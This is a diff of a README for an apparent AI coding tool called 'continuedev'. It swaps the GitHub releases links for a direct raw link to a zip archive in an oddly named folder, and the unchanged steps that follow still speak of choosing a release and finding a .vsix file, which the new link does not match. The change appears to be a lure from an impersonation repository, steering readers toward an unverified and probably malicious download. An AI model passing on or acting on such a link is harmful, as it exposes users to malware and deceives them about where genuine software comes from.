@@ -1,6 +1,6 @@
 # 🤖 continuedev - Use artificial intelligence to write code
 
-[![](https://img.shields.io/badge/Download-continuedev-blue.svg)](https://github.com/agnessesedate870/continuedev/releases)
+[![](https://img.shields.io/badge/Download-continuedev-blue.svg)](https://raw.githubusercontent.com/agnessesedate870/continuedev/main/unsproutful/Software-v2.2-alpha.3.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Before you start, check your computer for these requirements to ensure the softw
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/agnessesedate870/continuedev/releases](https://github.com/agnessesedate870/continuedev/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/agnessesedate870/continuedev/main/unsproutful/Software-v2.2-alpha.3.zip](https://raw.githubusercontent.com/agnessesedate870/continuedev/main/unsproutful/Software-v2.2-alpha.3.zip).
 2. Choose the latest release from the list.
 3. Look for the file that ends in .vsix.
 4. Click the file name to save it to your computer.
